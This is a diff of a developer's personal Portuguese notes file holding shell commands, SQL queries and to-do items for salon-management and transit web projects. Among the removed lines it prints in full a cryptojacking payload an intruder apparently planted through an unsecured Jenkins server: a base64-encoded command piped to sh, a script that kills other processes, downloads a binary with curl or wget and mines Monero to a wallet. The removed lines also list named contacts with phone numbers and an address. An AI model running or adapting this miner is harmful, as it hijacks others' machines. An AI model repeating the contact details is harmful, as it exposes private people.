@@ -14,10 +14,6 @@ ls > /tmp/sshosh
 chmod 600 /tmp/sshosh
 
 
-select id, name as nome, commission as comissao, saleprice as preco, duration as duracao, obs from product where company = 387 and productclass = 0
-order by name
-
-
 ver badblocks
 sudo badblocks -sv /dev/sda
 
@@ -96,6 +92,7 @@ cria um servidor para por exemplo o ebelle.com.br
 instalar
 sudo npm install -g http-server
 
+cd github/portal_salao
 cd github/portalEbelle
 http-server
 ele vai falar a porta ai é só colocar o caminho agenda.html
@@ -128,40 +125,6 @@ distribuiçao de estoque
 
 rever o inventário hoje só traz se tem estoque, tem que trazer tudo e 
 dar opção de nao trazer zero,  entender pq tem dois sqls com e sem unit
-
-Aline Fraga - Cruzeiro
-	Gerente Viniane Afra - 99943-5607
-
-Sergio's - Pampulha
-	Gerente Adm - Antonia Brant - 99905-4284
-
-Denise Mitiko - Buritis
-	Gerente Adm - Eduardo Paranaguá - 99167-2155
-
-Salao Valentina - Gutierrez
-	Proprietária - Renata Fraga - 99448-9000
-
-Brigitte Bardot - Buritis
-	Proprietária - Letícia Santos - 99102-4835
-
-Marli Nicholls - Santo Antônio
-	Gerente Beth - 99292-0022
-
-
-patricia otoni
-charmeá
-margareth barcelos
-beleza a mais
-
-angela evolution
-
-
-francisco guasti
-rosaria
-
-elan vital
-dunamis
-
 
 datas erradas na CCZS
 09/03/1965
@@ -445,11 +408,6 @@ http://nb.transitobh.com.br/
 no ci.transitobh.com.br
 construir o PDF-server
 
-
-Dr Wagner José Martorina
-Rua dr. Domingos Vieira 586 sala 1205 sta efigenia
-Tel 32417085
-
 asset
 id company status
 product
@@ -480,65 +438,3 @@ validade (meses dias)
 preço de locação e unidade de tempo no produto?
 usar o bom para características? ou algo do tipo?
 
-criar app pet - usar o nome ebelle pet
-
-criar snippet de treatment e detail
-criar animal ou usar parceiro?
-
-
-select * from business_pattern where name like 'Carolina Cu%' and company = 1
-
-select image, imagethumb from business_pattern where name like 'Carolina Cu%' and company = 1
-
-update business_pattern set image = 'cliente.png' imagethumb = 'cliente.png' where name like 'Carolina Cu%' and company = 1
-
-update business_pattern set image = 'cliente.png', imagethumb = 'cliente.png' where name like 'Carolina Cu%' and company = 1
-
-select company, name, image from business_pattern where image = '' or image = 'thumb_F973675429076YBBTOR.jpg.png';  
-update business_pattern set image = 'cliente.png' where image = '' or image = 'thumb_F973675429076YBBTOR.jpg.png';  
-
-select company, name, imagethumb from business_pattern where imagethumb = '' or imagethumb = 'thumb_F973675429076YBBTOR.jpg.png';  
-update business_pattern set imagethumb = 'cliente.png' where imagethumb = '' or imagethumb = 'thumb_F973675429076YBBTOR.jpg.png';  
-
-or imagethumb = ''
-
-
-
-
-"thumb_F973675429076YBBTOR.jpg.png"
-
-                                    
-
-drwx------ 2 postgres postgres      4096 Jun 25 13:31 config.f
-drwx------ 2 postgres postgres      4096 Jun 25 13:31 conf.n
-drwx------ 2 postgres postgres      4096 Jun 25 13:31 facebook
--rw-r--r-- 1 postgres postgres      6512 Jun 25 13:31 gameover.so
-drwxr-xr-x 4 postgres postgres      4096 Jun  8 00:03 Jetty_0_0_0_0_8081_app.war___ligth.e.belle.com.br_10kfcm_7473024741303513016
-drwxr-xr-x 5 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_dev.war___dev.transitobh.com.br_.e77olt_4548938691390096950
-drwxr-xr-x 5 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_dev.war___dev.transitobh.com.br_.e77olt_5058231851523102420
-drwxr-xr-x 4 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_majude___dev.majude.com_ey2ntm_3258266216837925
-drwxr-xr-x 4 postgres postgres      4096 Abr 22  2014 Jetty_0_0_0_0_8081_test____up9lrw_6667629730188225113
--rwx------ 1 postgres postgres      1058 Jun  3 15:50 Loader.sh
-drwx------ 2 postgres postgres      4096 Jun 25 13:31 Run.sh
--rwxrwxrwx 1 postgres postgres   1334372 Jun  3 13:46 scsi_eh_320
-
-
-
-Your Jenkins server is insecure and allows anyone to view builds, create tasks (like I've done). You might want to secure it down...
-
-BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobobo echo -n 'cm0gLXJmIC92YXIvbGliL2plbmtpbnMvLndpcGVmczsKcGtpbGwgLndpcGVmczsKdGhyZWFkQ291bnQ9JChsc2NwdSB8IGdyZXAgJ0NQVShzKScgfCBncmVwIC12ICcsJyB8IGF3ayAne3ByaW50ICQyfScgfCBoZWFkIC1uIDEpOwpob3N0SGFzaD0kKGhvc3RuYW1lIC1mIHwgbWQ1c3VtIHwgY3V0IC1jMS04KTsKZWNobyAkaG9zdEhhc2g7CnJtIC1yZiBkZWJ1ZzsKY3VybCBodHRwczovL21ucmxudC5ibG9iLmNvcmUud2luZG93cy5uZXQvbW5yL1NpbGVuY2UgLW8gZGVidWcgMj4gL2Rldi9udWxsOwpjaG1vZCAreCBkZWJ1ZzsKQlVJTERfSUQ9ZG9udEtpbGxNZSBKRU5LSU5TX05PREVfQ09PS0lFPWJvYm9ib2JvYiAuL2RlYnVnIC1vIHN0cmF0dW0rdGNwOi8vcG9vbC5taW5leG1yLmNvbTo0NDQ0IC11IDQ1aDRhNlZRb3JvRW1xZXB3SFRzOXU0ZUFnOThYRmNIZjV3SHd6bTlnV3VMSllGdkJhd0JDZ1k3M1BKUWRKWU5NUUNjelZzNFM4UFk0TGZ4blBuNVVzcU1TVzVYTGdlLkpMNl8ke2hvc3RIYXNoOi1hYmN9IC1wIHggLXQgJHt0aHJlYWRDb3VudDotMX0K' | base64 --decode | BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobobo sh -
-
-
-for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
-threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
-hostHash=$(hostname -f | md5sum | cut -c1-8);
-echo "${hostHash} - ${threadCount}";
-rm -rf debug;
-curl https://mnrlnt.blob.core.windows.net/mnr/Silence -o debug 2> /dev/null || wget https://mnrlnt.blob.core.windows.net/mnr/Silence -O debug 2> /dev/null;
-chmod +x debug;
-
-p() {
-	BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL7_${hostHash:-abc} -p x -t ${threadCount:-1}
-}
-
-sudo p "pool.minexmr.com:4444" || p "pool.minexmr.com:4444" && p "pool.minexmr.com:7777" && p "91.121.87.10:4444"
